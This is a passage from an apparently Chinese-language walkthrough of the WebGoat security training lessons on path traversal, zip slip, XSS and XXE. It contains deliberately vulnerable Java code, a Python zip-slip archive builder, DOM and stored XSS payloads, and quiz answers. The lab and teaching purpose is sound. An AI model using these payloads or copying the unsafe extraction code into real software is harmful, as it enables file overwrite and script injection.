    @GetMapping("/PathTraversal/random-picture")
    @ResponseBody
    public ResponseEntity<?> getProfilePicture(HttpServletRequest request){
        var queryParams = request.getQueryString();
//        这句话是重点 其中 getQueryString 是获取url中的查询字符串 并且不会进行url 解码 不会
        if (queryParams != null && (queryParams.contains("..") || queryParams.contains("/"))){
//            这里进行了严格匹配
            return ResponseEntity.badRequest().body("Illegal characters are not allowed in the query params");
        }
        try {
            var id = request.getParameter("id");
//            这里呢获取了这个id参数 其中呢会进行url解码
            var catPicture = new File(catPicturesDirectory,(id == null ? RandomUtils.nextInt(1,11) : id) + ".jpg");
            if (catPicture.getName().toLowerCase().contains("path-traversal-secret.jpg")){
//                如果包含 path-traversal-secret.jpg 就将内容返回回去
                return ResponseEntity.ok()
                        .contentType(MediaType.parseMediaType(MediaType.IMAGE_JPEG_VALUE))
                        .body(FileCopyUtils.copyToByteArray(catPicture));
            }
            if (catPicture.exists()){
                return ResponseEntity.ok()
                        .contentType(MediaType.parseMediaType(MediaType.IMAGE_JPEG_VALUE))
                        .location(new URI("/PathTraversal/random-picture?id="+catPicture.getName()))
                        .body(Base64.getEncoder().encode(FileCopyUtils.copyToByteArray(catPicture)));

            }
            return ResponseEntity.status(HttpStatus.NOT_FOUND)
                    .location(new URI("/PathTraversal/random-picture?id="+catPicture.getName()))
                    .body(StringUtils.arrayToCommaDelimitedString(catPicture.getParentFile().listFiles()).getBytes());

        }catch (IOException | URISyntaxException e){
            log.error("Image not found",e);
        }
        return ResponseEntity.badRequest().build();
    }
}
```

这里有个参数id 也不知道咋来的

![image-20220909224137992](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909224137992.png)

我们来看看重点代码

![image-20220909224426508](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909224426508.png)

![image-20220909224416278](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909224416278.png)

![image-20220909224523111](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909224523111.png)

![image-20220909224528186](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909224528186.png)

### ProfileZipSlip

```java
package com.wanan.webgoat.lessons.path_traversal;

import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.WebSession;
import lombok.SneakyThrows;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.ResponseEntity;
import org.springframework.util.FileCopyUtils;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import static org.springframework.http.MediaType.ALL_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@RestController
@AssignmentHints({"path-traversal-zip-slip.hint1", "path-traversal-zip-slip.hint2", "path-traversal-zip-slip.hint3", "path-traversal-zip-slip.hint4"})
public class ProfileZipSlip extends ProfileUploadBase {

    public ProfileZipSlip(@Value("${webgoat.server.directory}") String webGoatHomeDirectory, WebSession webSession) {
        super(webGoatHomeDirectory, webSession);
    }

    @PostMapping(value = "/PathTraversal/zip-slip", consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult uploadFileHandler(@RequestParam("uploadedFileZipSlip") MultipartFile file) {
        if (!file.getOriginalFilename().toLowerCase().endsWith(".zip")) {
//            如果文件名不是以.zip结尾
            return failed(this).feedback("path-traversal-zip-slip.no-zip").build();
        } else {
            return processZipUpload(file);
        }
    }
    @SneakyThrows
    private AttackResult processZipUpload(MultipartFile file) {
        var tmpZipDirectory = Files.createTempDirectory(getWebSession().getUserName());
//        获取文件名并创建一个临时目录
        var uploadDirectory = new File(getWebGoatHomeDirectory(), "/PathTraversal/" + getWebSession().getUserName());
//        对目录进行拼接
        var currentImage = getProfilePictureAsBase64();
//        获取下当前图片
        Files.createDirectories(uploadDirectory.toPath());
//        创建目录
        try {
            var uploadedZipFile = tmpZipDirectory.resolve(file.getOriginalFilename());
//            将临时路径添加进去
            FileCopyUtils.copy(file.getBytes(), uploadedZipFile.toFile());
//            将上传文件 存放进去
            ZipFile zip = new ZipFile(uploadedZipFile.toFile());
//            打开一个zip文件进行读取
            Enumeration<? extends ZipEntry> entries = zip.entries();
//            返回zip文件条目的枚举
            while (entries.hasMoreElements()) {
                ZipEntry e = entries.nextElement();
//                选择下一个
                File f = new File(uploadedZipFile.toFile(), e.getName());
//                新建一个文件实例
                InputStream is = zip.getInputStream(e);
//                将文件读入流
                Files.copy(is, f.toPath(), StandardCopyOption.REPLACE_EXISTING);
//                将文件复制进去 如果文件存在就清除
            }
            return isSolved(currentImage, getProfilePictureAsBase64());
        }catch (IOException e){
            return failed(this).output(e.getMessage()).build();
        }
    }

    private AttackResult isSolved(byte[] currentImage, byte[] newImage) {
        if (Arrays.equals(currentImage, newImage)) {
//            如果两个图片相等
            return failed(this).output("path-traversal-zip-slip.extracted").build();
        }
        return success(this).output("path-traversal-zip-slip.extracted").build();

    }
    @GetMapping("/PathTraversal/zip-slip")
    @ResponseBody
    public ResponseEntity<?> getProfilePicture(){
        return super.getProfilePicture();
    }
    @GetMapping("/PathTraversal/zip-slip/profile-image/{username}")
    @ResponseBody
    public ResponseEntity<?> getProfilePicture(@PathVariable("username")String username){
        return ResponseEntity.notFound().build();
    }
}
```

这里考察的其实是zip slip目录遍历漏洞

![image-20220910132227695](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910132227695.png)

我们先看怎么做

```python
import zipfile

zf = zipfile.ZipFile('zf.zip',"w")
fname = "zf.jpg"
zf.write(fname,"../../../../../../../../../../../../Users/14980/.webgoat-8.2.3-SNAPSHOT/PathTraversal/123456/zf.jpg")
```

这里是使用python生成一个zf.zip 其中的内容呢是 zf.jpg中的内容 而压缩后的文件名为后面的一长串 

![image-20220910132923157](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910132923157.png)

上传zip

![image-20220910133013887](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910133013887.png)

这里可以看到经过目录穿越到达了这个目录下面

![image-20220910133100966](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910133100966.png)

这里的判断结果也是两个数组是否相同 也就是图片有没有上传上去

![image-20220910133201950](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910133201950.png)

![image-20220910133227276](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910133227276.png)

## xss

### CrossSiteScripting

```java
package com.wanan.webgoat.lessons.xss;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class CrossSiteScripting extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A3;
    }

    @Override
    public String getTitle() {
        return "xss.title";
    }
}
```

### CrossSiteScriptingLesson1

```java
package com.wanan.webgoat.lessons.xss;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class CrossSiteScriptingLesson1 extends AssignmentEndpoint {
    @PostMapping("/CrossSiteScripting/attack1")
    @ResponseBody
    public AttackResult completed(@RequestParam(value = "checkboxAttack1",required = false)String checkboxValue){
        if (checkboxValue != null){
            return success(this).build();
        }
        return failed(this).feedback("xss.lesson1.failure").build();
    }
}
```

这关让我们了解什么xss

![image-20220910134114167](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910134114167.png)

选中对号即可过关

![image-20220910134128457](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910134128457.png)

### CrossSiteScriptingLesson5a

```java
package com.wanan.webgoat.lessons.xss;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.util.function.Predicate;
import java.util.regex.Pattern;

@RestController
@AssignmentHints(value = {"xss-reflected-5a-hint-1", "xss-reflected-5a-hint-2", "xss-reflected-5a-hint-3", "xss-reflected-5a-hint-4"})
public class CrossSiteScriptingLesson5a extends AssignmentEndpoint {
    public static final Predicate<String > XSS_PATTERN = Pattern.compile(".*<script>(console\\.log|alert)\\(.*\\);?</script>.*",Pattern.CASE_INSENSITIVE).asMatchPredicate();
    @Autowired
    UserSessionData userSessionData;
    @GetMapping("/CrossSiteScripting/attack5a")
    @ResponseBody
    public AttackResult completed(@RequestParam Integer QTY1,
                                  @RequestParam Integer QTY2, @RequestParam Integer QTY3,
                                  @RequestParam Integer QTY4, @RequestParam String field1,
                                  @RequestParam String field2) {
        if (XSS_PATTERN.test(field2)){
            return failed(this).feedback("xss-reflected-5a-failed-wrong-field").build();
        }
        double totalSale = QTY1.intValue() * 69.99 + QTY2.intValue() + 27.99 + QTY3.intValue() * 1599.99 + QTY4.intValue() * 299.99;

        userSessionData.setValue("xss-reflected1-complete","false");
        StringBuffer cart = new StringBuffer();
        cart.append("Thank you for shopping at WebGoat. <br />Your support is appreciated<hr />");
        cart.append("<p>We have charged credit card:" + field1 + "<br />");
        cart.append("                             ------------------- <br />");
        cart.append("                               $" + totalSale);
        if (userSessionData.getValue("xss-reflected1-complete") == null){
            userSessionData.setValue("xss-reflected1-complete","false");
        }
        if (XSS_PATTERN.test(field1)){
            userSessionData.setValue("xss-reflected-5a-complete", "true");
            if (field1.toLowerCase().contains("console.log")){
                return success(this).feedback("xss-reflected-5a-success-console").output(cart.toString()).build();
            }else {
                return success(this).feedback("xss-reflected-5a-success-alert").output(cart.toString()).build();
            }
        }else {
            userSessionData.setValue("xss-reflected1-complete","false");
            return failed(this).feedback("xss-reflected-5a-failure")
                    .output(cart.toString())
                    .build();
        }
    }
}
```

![image-20220910153412297](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910153412297.png)

### CrossSiteScriptingLesson6a

```java
package com.wanan.webgoat.lessons.xss;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints(value = {"xss-reflected-6a-hint-1", "xss-reflected-6a-hint-2", "xss-reflected-6a-hint-3", "xss-reflected-6a-hint-4"})
public class CrossSiteScriptingLesson6a extends AssignmentEndpoint {
    @Autowired
    UserSessionData userSessionData;
    @PostMapping("/CrossSiteScripting/attack6a")
    @ResponseBody
    public AttackResult completed(@RequestParam String DOMTestRoute){
        if (DOMTestRoute.matches("start\\.mvc#test(\\/|)")){
            return success(this).feedback("xss-reflected-6a-success").build();
        }else {
            return failed(this).feedback("xss-reflected-6a-failure").build();
        }
    }
}
```

![image-20220910154405873](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910154405873.png)

### DOMCrossSiteScriptingVerifier

```java
package com.wanan.webgoat.lessons.xss;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints(value = {"xss-dom-message-hint-1", "xss-dom-message-hint-2", "xss-dom-message-hint-3", "xss-dom-message-hint-4", "xss-dom-message-hint-5", "xss-dom-message-hint-6"})
public class DOMCrossSiteScriptingVerifier extends AssignmentEndpoint {
    @PostMapping("/CrossSiteScripting/dom-follow-up")
    @ResponseBody
    public AttackResult completed(@RequestParam String  successMessage){
        UserSessionData userSessionData = getUserSessionData();
        String answer = (String) userSessionData.getValue("randValue");
        if (successMessage.equals(answer)){
            return success(this).feedback("xss-dom-message-success").build();
        }else {
            return failed(this).feedback("xss-dom-message-failure").build();
        }
    }
}
```

### DOMCrossSiteScripting

```java
package com.wanan.webgoat.lessons.xss;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.security.SecureRandom;

@RestController
public class DOMCrossSiteScripting extends AssignmentEndpoint {
    @PostMapping("/CrossSiteScripting/phone-home-xss")
    @ResponseBody
    public AttackResult completed(@RequestParam Integer param1,
                                  @RequestParam Integer param2, HttpServletRequest request){
        UserSessionData userSessionData = getUserSessionData();
        SecureRandom number = new SecureRandom();
        userSessionData.setValue("randValue",String.valueOf(number.nextInt()));
        
        if (param1 == 42 && param2 == 24 && request.getHeader("webgoat-requested-by").equals("dom-xss-vuln")){
            return success(this).output("phoneHome Response is "+ userSessionData.getValue("randValue".toString())).build();
        }else {
            return failed(this).build();
        }
    }
}
```

这里是根据上一关给的 start.mvc#test/ 去构造 dom xss

可以发现存在回显 

```
http://127.0.0.1:8081/WebGoat/start.mvc#test/webgoat.customjs.phoneHome()
```

![image-20220910162859176](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910162859176.png)

但是并没有执行 原因就是没有当做js代码执行

```
127.0.0.1:8081/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()
```

![image-20220910175533353](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910175533353.png)

提交即可

![image-20220910175612140](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910175612140.png)

这里奇怪的是 如果补全了就不执行了

```
http://127.0.0.1:8081/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()</script>
```

![image-20220910163030582](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910163030582.png)

### CrossSiteScriptingQuiz

```java
package com.wanan.webgoat.lessons.xss;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.*;

import java.io.IOException;

@RestController
public class CrossSiteScriptingQuiz extends AssignmentEndpoint {
    String[] solutions  = {"Solution 4","Solution 3","Solution 1","Solution 2","Solution 4"};
    boolean[] guesses = new boolean[solutions.length];

    @PostMapping("/CrossSiteScripting/quiz")
    @ResponseBody
    public AttackResult completed(@RequestParam String[] question_0_solution, @RequestParam String[] question_1_solution, @RequestParam String[] question_2_solution, @RequestParam String[] question_3_solution, @RequestParam String[] question_4_solution) throws IOException {
        int correctAnswers = 0;
        String[] givenAnswers = {question_0_solution[0], question_1_solution[0], question_2_solution[0], question_3_solution[0], question_4_solution[0]};

        for (int i = 0;i < solutions.length;i++){
            if (givenAnswers[i].contains(solutions[i])){
                if (givenAnswers[i].contains(solutions[i])){
                    correctAnswers ++ ;
                    guesses[i] = true;
                }else {
                    guesses[i] = false;
                }
            }
        }
        if (correctAnswers == solutions.length){
            return success(this).build();
        }else {
            return failed(this).build();
        }
    }
    @GetMapping("/CrossSiteScripting/quiz")
    @ResponseBody
    public boolean[] getResults() {
        return this.guesses;
    }
}
```

答案 4 3 1 2 4

![image-20220910165049946](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910165049946.png)

### stored

#### CrossSiteScriptingStored

```java
package com.wanan.webgoat.lessons.xss.stored;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class CrossSiteScriptingStored extends Lesson {

    @Override
    protected Category getDefaultCategory() {
        return Category.A3;
    }

    @Override
    public String getTitle() {
        return "xss-stored.title";
    }
}

```

#### StoredXssComments

注意与原文的差异

![image-20220911115820497](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911115820497.png)

```java
package com.wanan.webgoat.lessons.xss.stored;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.google.common.collect.Lists;
import com.headius.invokebinder.transform.Collect;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.WebSession;
import org.joda.time.DateTime;
import org.joda.time.format.DateTimeFormat;
import org.joda.time.format.DateTimeFormatter;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;


import java.awt.*;
import java.util.*;
import java.util.List;

import static org.springframework.http.MediaType.ALL_VALUE;

@RestController
public class StoredXssComments extends AssignmentEndpoint {
    @Autowired
    private WebSession webSession;
    private static DateTimeFormatter fmt = DateTimeFormat.forPattern("yyyy-mm-dd, HH:mm:ss");
//    创建时间格式化对象
    private static final Map<String , List<Comment>> userComments = new HashMap<>();
//    用于存放用户评论的map
    private static final List<Comment> comments = new ArrayList<>();
//    存放评论的list
    private static final String phoneHomeString = "<script>webgoat.customjs.phoneHome()</script>";
//    这个是作为用户通关的条件
    static {
        comments.add(new Comment("secUriTy", DateTime.now().toString(fmt),"<script>console.warn(' unit test me')</script>Comment for Unit Testing"));
        comments.add(new Comment("webgoat",DateTime.now().toString(fmt),"This comment is safe"));
        comments.add(new Comment("guest",DateTime.now().toString(fmt),"This one is safe too."));
        comments.add(new Comment("guest",DateTime.now().toString(fmt),"Can you post a comment, calling webgoat.customjs.phoneHome() ?"));
    }
    @GetMapping(path = "/CrossSiteScripting/stored-xss",produces = MediaType.APPLICATION_JSON_VALUE,consumes = ALL_VALUE)
    @ResponseBody
    public Collection<Comment> retrieveComments(){
//        检索信息
        List<Comment> allComments = Lists.newArrayList();
        Collection<Comment> newComments = userComments.get(webSession.getUserName());
//        获取当前用户的所有评论
        allComments.addAll(comments);
//        追加comments所有元素到allComments中去
        if (newComments != null) {
            allComments.addAll(newComments);
//            追加用户添加的评论
        }
        Collections.reverse(allComments);
//        逆序评论
        return allComments;
    }

    @PostMapping("/CrossSiteScripting/stored-xss")
    @ResponseBody
    public AttackResult createNewComment(@RequestBody String commentStr){
        Comment comment = parseJson(commentStr);
//        将评论反序列化回对象
        List<Comment> comments = userComments.getOrDefault(webSession.getUserName(),new ArrayList<>());
//        获取当前用户所有评论
        comment.setDateTime(DateTime.now().toString(fmt));

        comment.setUser(webSession.getUserName());
        comments.add(comment);
        userComments.put(webSession.getUserName(),comments);
        if (comment.getText().contains(phoneHomeString)){
            return success(this).feedback("xss-stored-comment-success").build();
        }else {
            return failed(this).feedback("xss-stored-comment-failure").build();
        }

    }
    private Comment parseJson(String comment ){
        ObjectMapper mapper = new ObjectMapper();
//        新建一个对象映射器
        try {
            return mapper.readValue(comment,Comment.class);
//            对这个comment 进行读值
        } catch (JsonProcessingException e) {
            return new Comment();
        }
    }
}
```

##### Comment

```java
package com.wanan.webgoat.lessons.xss.stored;

import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.Setter;

import javax.xml.bind.annotation.XmlRootElement;

@Getter
@Setter
@AllArgsConstructor
@NoArgsConstructor
@XmlRootElement
public class Comment {
    private String user;
    private String dateTime;
    private String text;
}
```

##### StoredCrossSiteScriptingVerifier

注意差异

![image-20220911120330288](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911120330288.png)

```java
package com.wanan.webgoat.lessons.xss.stored;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class StoredCrossSiteScriptingVerifier extends AssignmentEndpoint {

    @PostMapping("/CrossSiteScriptingStored/stored-xss-follow-up")
    @ResponseBody
    public AttackResult completed(@RequestParam String successMessage){
        UserSessionData userSessionData = getUserSessionData();
        if (successMessage.equals(userSessionData.getValue("randValue").toString())){
            return success(this).feedback("xss-stored-callback-success").build();
        }else {
            return failed(this).feedback("xss-stored-callback-failure").build();
        }
    }
}
```

存储进去后提交即可

![image-20220911120209677](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911120209677.png)

![image-20220911120538752](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911120538752.png)

#### CrossSiteScriptingMitigation

注意与原文的差异

![image-20220910165707983](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910165707983.png)

```java
package com.wanan.webgoat.lessons.xss;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
@Component
public class CrossSiteScriptingMitigation extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A3;
    }

    @Override
    public String getTitle() {
        return "xss-mitigation.title";
    }
}
```

#### CrossSiteScriptingLesson3

![image-20220911120920537](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911120920537.png)

```java
package com.wanan.webgoat.lessons.xss;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AssignmentPath;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints(value = {"xss-mitigation-3-hint1", "xss-mitigation-3-hint2", "xss-mitigation-3-hint3", "xss-mitigation-3-hint4"})
public class CrossSiteScriptingLesson3 extends AssignmentEndpoint {
    @PostMapping("/CrossSiteScripting/attack3")
    @ResponseBody
    public AttackResult completed(@RequestParam String editor){
        String unescapedString = org.jsoup.parser.Parser.unescapeEntities(editor,true);
//        取消html 实体字符的转义
        try {
            if (editor.isEmpty())
                return failed(this).feedback("xss-mitigation-3-no-code").build();
            Document doc = Jsoup.parse(unescapedString);
//            将 html 字符解析为文档
            String[] lines = unescapedString.split("<html>");
//            以<html> 分割字符
            String include = (lines[0]);
            String fistNameElement = doc.select("body > table > tbody > tr:nth-child(1) > td:nth-child(2)").first().text();
            String lastNameElement = doc.select("body > table > tbody > tr:nth-child(2) > td:nth-child(2)").first().text();

            Boolean includeCorrect = false;
            Boolean firstNameCorrect = false;
            Boolean lastNameCorrect = false;
            if (include.contains("<%@") && include.contains("taglib") && include.contains("uri=\"https://www.owasp.org/index.php/OWASP_java_Encode_Project\"") && include.contains("%>")){
                includeCorrect = true;
            }
            if (fistNameElement.equals("${e:forHtml(param.first_name)}")) {
                firstNameCorrect = true;
            }
            if (lastNameElement.equals("${e:forHtml(param.last_name)}")){
                lastNameCorrect = true;
            }
            if (includeCorrect && firstNameCorrect && lastNameCorrect){
                return success(this).feedback("xss-mitigation-3-success").build();
            }else {
                return failed(this).feedback("xss-mitigation-3-failure").build();
            }
        }catch (Exception e){
            return failed(this).output(e.getMessage()).build();
        }
    }
}

```

这里是让我们写缓解措施 这里我们读读

![image-20220911122117941](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911122117941.png)

![image-20220911122130960](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911122130960.png)

这里找到了缓解措施 我们直接抄 但是直接抄会出问题

```jsp
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<%@taglib prefix="e" uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %>
<html>
<head>
    <title>Using GET and POST Method to Read Form Data</title>
</head>
<body>
    <h1>Using POST Method to Read Form Data</h1>
    <table>
        <tbody>
            <tr>
                <td><b>First Name:</b></td>
                <td>${e:forHtml(param.first_name)}</td>
            </tr>
            <tr>
                <td><b>Last Name:</b></td>
                <td>${e:forHtml(param.last_name)}</td>
            </tr>
        </tbody>
    </table>
</body>
</html>



```

一大一小 后面也不一样 直接复制了

![image-20220911123231379](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911123231379.png)

答案

```jsp
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<%@taglib prefix="e" uri="https://www.owasp.org/index.php/OWASP_java_Encode_Project" %>
<html>
<head>
    <title>Using GET and POST Method to Read Form Data</title>
</head>
<body>
    <h1>Using POST Method to Read Form Data</h1>
    <table>
        <tbody>
            <tr>
                <td><b>First Name:</b></td>
                <td>${e:forHtml(param.first_name)}</td>
            </tr>
            <tr>
                <td><b>Last Name:</b></td>
                <td>${e:forHtml(param.last_name)}</td>
            </tr>
        </tbody>
    </table>
</body>
</html>



```

![image-20220911123553828](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911123553828.png)

#### CrossSiteScriptingLesson4

注意差异

![image-20220911120959361](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911120959361.png)

```java
package com.wanan.webgoat.lessons.xss;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@Slf4j
@AssignmentHints(value = {"xss-mitigation-4-hint1"})
public class CrossSiteScriptingLesson4 extends AssignmentEndpoint {
    @PostMapping("/CrossSiteScripting/attack4")
    @ResponseBody
    public AttackResult completed(@RequestParam String editor2){
        String editor =editor2.replaceAll("\\<.*?>","");
//        进行了过滤
        log.debug(editor);
        if ((editor.contains("Policy.getInstance(\"antisamy-slashdot.xml\"") || editor.contains(".scan(newComment, \"antisamy-slashdot.xml\"") || editor.contains(".scan(newComment, new File(\"antisamy-slashdot.xml\")")) &&
                editor.contains("new AntiSamy();") &&
                editor.contains(".scan(newComment,") &&
                editor.contains("CleanResults") &&
                editor.contains("MyCommentDAO.addComment(threadID, userID") &&
                editor.contains(".getCleanHTML());")){
            log.debug("true");
            return  success(this).feedback("xss-mitigation-4-success").build();
        }else {
            log.debug("false");
            return failed(this).feedback("xss-mitigation-4-failed").build();
        }
    }
}

```

```java
import org.owasp.validator.html.*;
import MyCommentDAO;

public class AntiSamyController {
    public void saveNewComment(int threadID, int userID, String newComment){
        Policy p = Policy.getInstance("antisamy-slashdot.xml");
        AntiSamy as = new AntiSamy();
        CleanResults cr = as.scan(newComment,p);
        MyCommentDAO.addComment(threadID, userID, cr.getCleanHTML());
    }
}
```

![image-20220911125152801](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911125152801.png)

## xxe

### XXE

```java
package com.wanan.webgoat.lessons.xxe;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class XXE extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A5;
    }

    @Override
    public String getTitle() {
        return "xxe.title";
    }
}
```

### SimpleXXE

```java
package com.wanan.webgoat.lessons.xxe;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.apache.commons.exec.OS;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;


import static org.springframework.http.MediaType.ALL_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@RestController
@AssignmentHints({"xxe.hints.simple.xxe.1", "xxe.hints.simple.xxe.2", "xxe.hints.simple.xxe.3", "xxe.hints.simple.xxe.4", "xxe.hints.simple.xxe.5", "xxe.hints.simple.xxe.6"})
public class SimpleXXE extends AssignmentEndpoint {
    private static final String[] DEFAULT_LINUX_DIRECTORIES = {"usr","etc","var"};
//    定义好linux系统下的目录
    private static final String[] DEFAULT_WINDOWS_DIRECTORIES = {"Windows", "Program Files (x86)", "Program Files", "pagefile.sys"};
//   win
    @Value("${webgoat.server.directory}")
    private String webGoatHomeDirectory;
//    获取运行路径
    @Value("${webwolf.landingpage.url}")
    private String webWolfURL;
//  获取webwolfurl
    @Autowired
    private CommentsCache comments;

    @PostMapping(path = "xxe/simple",consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult createNameComment(HttpServletRequest request, @RequestBody String commentStr){
